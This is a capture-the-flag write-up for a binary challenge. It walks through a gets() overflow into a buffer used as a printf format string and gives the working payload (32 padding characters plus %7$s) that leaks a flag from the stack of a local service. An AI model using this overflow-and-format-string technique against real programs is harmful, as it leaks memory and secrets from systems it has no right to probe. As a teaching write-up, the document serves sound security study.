## Writeup

The challenge is pretty simple,

looking at the decompiled c code in ghidra:

``` c
undefined8 main(void)

{
  long in_FS_OFFSET;
  char local_68 [32];
  char local_48 [56];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  builtin_strncpy(local_48,"Thanks for your message, I will reply soon\n",0x2c);
  puts("Please submit your greviance:");
  gets(local_68);
  get_flag();
  printf(local_48);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

there is a `gets` with no checks, which writes into buffer `local_68`, and a `printf` which prints a variable within the format argument `local_48`

the stakc looks like this:

``` stack
undefined         <UNASSIGNED>   <RETURN>
undefined8        Stack[-0x10]:8 local_10
undefined8        Stack[-0x24]:8 local_24
undefined8        Stack[-0x30]:8 local_30
undefined8        Stack[-0x38]:8 local_38 
undefined8        Stack[-0x40]:8 local_40 
undefined8        Stack[-0x48]:8 local_48 (printed value)
undefined         Stack[-0x68]:1 local_68 (user input)
undefined8        Stack[-0x70]:8 local_70 (flag value)
```

So knowing this, and with the unmaxed `gets`, we can buffer overflow into `local_48` so long as we type `32` characters first, and then as it is printed as the format, we can do a string format vulnarability to print stack values.

This can be tested by first checking if overflows are possible, then checking if string format attcks are possible:

``` bash
# normal

$ nc localhost 1337
Please submit your greviance:
test
Thanks for your message, I will reply soon

# overflow
$ nc localhost 1337
Please submit your greviance:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
a
^C

$ nc localhost 1337
Please submit your greviance:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%x %x %x 
1 5a55c8d7 1c ^C
```

Using this we can read from the top of the stack (where the flag is) with `%7$s`, as `printf` takes first six registers then starts taking stack values, (the `%7` tells it to take the sevent element which is the (7 - 6 = 1) top item in the stack).

The `$s` tells it so take the value at the top of the stack as a pointer and read the memory address it points to as a string

``` bash
$ nc localhost 1337
Please submit your greviance:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%7$s
pecan{4n_0v3rfl0w_into_4_5tr1ng_f0rm4t?}^C
```

and thats the flag:
``` flag
pecan{4n_0v3rfl0w_into_4_5tr1ng_f0rm4t?}
```